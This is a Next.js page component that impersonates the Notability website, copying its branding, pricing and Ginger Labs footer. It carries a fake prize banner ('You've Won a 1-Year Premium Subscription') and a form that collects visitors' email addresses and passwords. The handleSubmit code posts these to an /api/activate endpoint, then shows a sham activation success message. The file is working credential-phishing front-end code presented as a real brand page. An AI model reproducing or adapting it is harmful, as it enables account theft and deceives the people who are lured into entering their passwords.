"use client"
import Image from "next/image";
import { useState } from "react";
import { FaInstagram, FaYoutube, FaTiktok, FaXTwitter, FaLinkedinIn } from "react-icons/fa6";

export default function Home() {
  const [showSuccessMessage, setShowSuccessMessage] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage(null);

    const email = e.target.email.value;
    const password = e.target.password.value;

    try {
      const response = await fetch("/api/activate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      if (response.ok) {
        const result = await response.json();
        console.log(result.message);
        setShowSuccessMessage(true);
      } else {
        const errorData = await response.json();
        setErrorMessage(errorData.message || "Aktivasyon başarısız oldu. Lütfen tekrar deneyin.");
        console.error("Activation failed:", response.statusText, errorData);
      }
    } catch (error) {
      setErrorMessage("Ağ hatası oluştu. Lütfen internet bağlantınızı kontrol edin.");
      console.error("Error during activation:", error);
    }
  };

  return (
    <div className="min-h-screen bg-white text-gray-900">
      {/* Header */}
      <header className="container mx-auto px-4 py-6 flex justify-between items-center">
        <div className="flex items-center space-x-2">
          <Image
            src="/logo.png"
            alt="Notability Logo"
            width={150}
            height={150}
            priority
          />
        </div>
        <nav className="hidden md:flex space-x-6">
          <a href="#" className="text-gray-600 hover:text-[#00A3FF]">Business</a>
          <a href="#" className="text-gray-600 hover:text-[#00A3FF]">Education</a>
          <a href="#" className="text-gray-600 hover:text-[#00A3FF]">Subscription</a>
          <a href="#" className="text-gray-600 hover:text-[#00A3FF]">Resources</a>
          <svg className="w-4 h-4 mt-1 ml-1 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
          </svg>
        </nav>
        <button className="bg-[#007AFF] hover:bg-[#005ECF] text-white font-semibold py-2 px-6 rounded-lg text-base transition-colors duration-200 shadow-md">
          Get App
        </button>
      </header>

      <main>
        {/* Section 1: Notability is free to use! */}
        <section className="container mx-auto px-4 py-16 grid md:grid-cols-2 gap-16 items-center bg-gray-50 rounded-3xl mt-8 shadow-inner">
          <div className="order-2 md:order-1">
            <h1 className="text-4xl font-bold text-gray-900 mb-6 leading-tight">
              Notability is free to use!
            </h1>
            <p className="text-lg text-gray-700 mb-8 leading-relaxed">
              Import documents for annotating, record lectures while taking notes, create custom templates... and much more! Enjoy the advantages of digital note-taking for free with limited edits.
            </p>
            <button className="bg-[#007AFF] hover:bg-[#005ECF] text-white font-semibold py-3 px-8 rounded-lg text-lg transition-colors duration-200 shadow-md">
              Get App
            </button>
          </div>
          <div className="order-1 md:order-2 flex justify-center items-center">
            <Image
              src='/Ekran_Resmi_2025-06-15_11.54.25-removebg-preview.png'
              alt="Notability Free Illustration"
              width={550}
              height={400}
              layout="responsive"
              objectFit="contain"
            />
          </div>
        </section>

        {/* Section 2.1: Pro Membership Offer (New) */}
        <section className="container mx-auto px-4 py-16 flex justify-center">
          <div className="bg-white rounded-3xl p-6 max-w-sm text-center shadow-md relative overflow-hidden border border-gray-100">
            {/* PRO Badge */}
            <div className="absolute top-4 left-1/2 -translate-x-1/2 bg-pink-100 text-pink-700 text-sm font-bold px-4 py-2 rounded-full transform rotate-1 border border-pink-200">
              PRO
            </div>

            <h2 className="text-gray-900 text-3xl font-bold mt-12 mb-4 leading-tight">
              For strong note takers
            </h2>
            <p className="text-gray-700 text-lg mb-8 leading-relaxed">
              Everything is in Plus with Unlimited Learn.
            </p>

            {/* Price Display */}
            <div className="bg-gray-50 border border-gray-200 rounded-2xl p-6 flex justify-between items-center">
              <span className="text-gray-900 text-2xl font-bold">
                US$119,99/y
              </span>
              <div className="w-8 h-8 rounded-full border-2 border-gray-300 flex items-center justify-center">
                {/* Optional: Add a checkmark or selected state here if needed */}
              </div>
            </div>
          </div>
        </section>

        {/* Section 2: 1-Year Free Subscription Activation */}
        <section className="container mx-auto px-4 py-16 max-w-4xl text-center">
          <span className="inline-block bg-yellow-400 text-black text-xs font-bold px-3 py-1 rounded-full mb-4">
            PREMIUM GIFT
          </span>
          <h2 className="text-4xl font-bold text-gray-900 mb-6 leading-tight">
            Congratulations! You&apos;ve Won a 1-Year Premium Subscription!
          </h2>
          <p className="text-lg text-gray-700 mb-10">
            Enter your email and password below to activate your exclusive 1-year Notability Premium membership.
          </p>

          {errorMessage && (
            <div className="bg-red-50 border border-red-200 text-red-800 p-4 rounded-md mb-6 text-sm">
              {errorMessage}
            </div>
          )}

          {showSuccessMessage ? (
            <div className="bg-green-50 border border-green-200 text-green-800 p-8 rounded-2xl shadow-lg mt-8">
              <h3 className="text-3xl font-bold mb-4">Membership Activated! 🎉</h3>
              <p className="text-lg leading-relaxed">
                Your 1-year Notability Premium membership has been successfully activated.
                Enjoy all the powerful features!
              </p>
              <p className="mt-6 text-md text-gray-600">
                You can now close this page or return to the Notability app.
              </p>
            </div>
          ) : (
            <form className="max-w-sm mx-auto space-y-6" onSubmit={handleSubmit}>
              <div>
                <label htmlFor="email" className="sr-only">Email Address</label>
                <input
                  type="email"
                  id="email"
                  name="email"
                  placeholder="Email Address"
                  className="w-full px-5 py-3 border border-gray-300 rounded-lg shadow-sm focus:ring-[#00A3FF] focus:border-[#00A3FF]"
                  required
                />
              </div>
              <div>
                <label htmlFor="password" className="sr-only">Password</label>
                <input
                  type="password"
                  id="password"
                  name="password"
                  placeholder="Password"
                  className="w-full px-5 py-3 border border-gray-300 rounded-lg shadow-sm focus:ring-[#00A3FF] focus:border-[#00A3FF]"
                  required
                />
              </div>
              <button type="submit" className="w-full bg-[#00A3FF] hover:bg-[#0090E6] text-white font-semibold py-3 px-6 rounded-lg text-lg transition-colors duration-200 shadow-md">
                Activate My Subscription
              </button>
              <p className="mt-4 text-sm text-gray-500">
                By activating, you agree to Notability&apos;s Terms of Service and Privacy Policy.
              </p>
              <p className="mt-2 text-sm text-center">
                <a href="https://notability.com/password/reset" className="text-[#007AFF] hover:underline">
                  Reset your password
                </a>
              </p>
            </form>
          )}
        </section>

        {/* Section 3: What's included in... */}
        <section className="container mx-auto px-4 py-16 text-center">
          <h2 className="text-3xl font-bold text-gray-900 mb-12">
            What&apos;s included in...
          </h2>
          <div className="grid md:grid-cols-2 gap-8">
            {/* Notability Starter */}
            <div className="bg-blue-50 rounded-3xl p-8 text-left shadow-lg">
              <h3 className="text-2xl font-bold text-gray-900 mb-6">Notability Starter</h3>
              <ul className="space-y-4">
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Create multi-media notes with limited edits</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>PDF import and annotation</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Audio recording synced to your notes</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Gallery and templates</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Presentation Mode</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Document Scanning</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Various sharing and export options</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Multi-note side by side viewing</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Stickers, themes and more!</span>
                </li>
              </ul>
            </div>

            {/* Notability Plus */}
            <div className="bg-yellow-50 rounded-3xl p-8 text-left shadow-lg">
              <h3 className="text-2xl font-bold text-gray-900 mb-6">Notability Plus</h3>
              <p className="text-lg text-gray-700 mb-6">Everything in Notability Starter plus:</p>
              <ul className="space-y-4">
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Unlimited edits and notes</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Handwriting conversion and search</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>iCloud Sync</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Auto-back up</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Math Conversion</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Automatic audio transcription</span>
                </li>
                <li className="flex items-start text-lg text-gray-700">
                  <svg className="w-6 h-6 text-[#00A3FF] mr-3 mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                  <span>Learn: note summaries, quizzes, and flashcards</span>
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* Section 4: Are you part of an education institution? */}
        <section className="bg-blue-100 py-16 text-center">
          <div className="container mx-auto px-4 max-w-4xl">
            <h2 className="text-3xl font-bold text-gray-900 mb-6">
              Are you part of an education institution?
            </h2>
            <p className="text-lg text-gray-700 mb-10">
              For the first time ever, we&apos;re able to offer Notability for free to educational institutions through Apple School Manager. If you are an institution representative, contact us!
            </p>
            <button className="bg-[#007AFF] hover:bg-[#005ECF] text-white font-semibold py-3 px-8 rounded-lg text-lg transition-colors duration-200 shadow-md mb-8">
              Contact Sales
            </button>
            <div className="flex justify-center">
              <Image
                src="/illustration-character.svg"
                alt="Education Illustration"
                width={300}
                height={200}
                layout="fixed"
                objectFit="contain"
              />
            </div>
        </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-gray-100 py-12 text-gray-700">
        <div className="container mx-auto px-4 grid grid-cols-1 md:grid-cols-4 gap-8">
          <div>
            <h4 className="font-bold mb-4">Product</h4>
            <ul className="space-y-2">
              <li><a href="#" className="hover:underline">Get Notability</a></li>
              <li><a href="#" className="hover:underline">Twobird</a></li>
              <li><a href="#" className="hover:underline">Pricing</a></li>
              <li><a href="#" className="hover:underline">Features</a></li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold mb-4">Company</h4>
            <ul className="space-y-2">
              <li><a href="#" className="hover:underline">Jobs</a></li>
              <li><a href="#" className="hover:underline">Support</a></li>
              <li><a href="#" className="hover:underline">About Us</a></li>
              <li><a href="#" className="hover:underline">Blog</a></li>
            </ul>
          </div>
          <div className="md:col-span-2">
            <h4 className="font-bold mb-4">Subscribe to our newsletter</h4>
            <form className="flex space-x-2">
              <input
                type="email"
                placeholder="Enter email address"
                className="flex-grow px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00A3FF]"
              />
              <button type="submit" className="bg-[#007AFF] hover:bg-[#005ECF] text-white font-semibold py-2 px-4 rounded-lg transition-colors duration-200">
                Sign Up
              </button>
            </form>
            <h4 className="font-bold mt-8 mb-4">Connect with us</h4>
            <div className="flex space-x-4">
              <a href="#" aria-label="Instagram" className="text-gray-600 hover:text-[#00A3FF]">
                <FaInstagram className="w-6 h-6" />
              </a>
              <a href="#" aria-label="YouTube" className="text-gray-600 hover:text-[#00A3FF]">
                <FaYoutube className="w-6 h-6" />
              </a>
              <a href="#" aria-label="TikTok" className="text-gray-600 hover:text-[#00A3FF]">
                <FaTiktok className="w-6 h-6" />
              </a>
              <a href="#" aria-label="X" className="text-gray-600 hover:text-[#00A3FF]">
                <FaXTwitter className="w-6 h-6" />
              </a>
              <a href="#" aria-label="LinkedIn" className="text-gray-600 hover:text-[#00A3FF]">
                <FaLinkedinIn className="w-6 h-6" />
              </a>
            </div>
            <p className="mt-8 text-sm text-gray-500">
              © 2023 Ginger Labs <span className="mx-1">•</span> Notability is a registered trademark of Ginger Labs, Inc.
            </p>
            <div className="mt-4 text-sm">
              <a href="#" className="text-gray-500 hover:underline mr-4">Privacy Policy</a>
              <a href="#" className="text-gray-500 hover:underline">Terms of Service</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
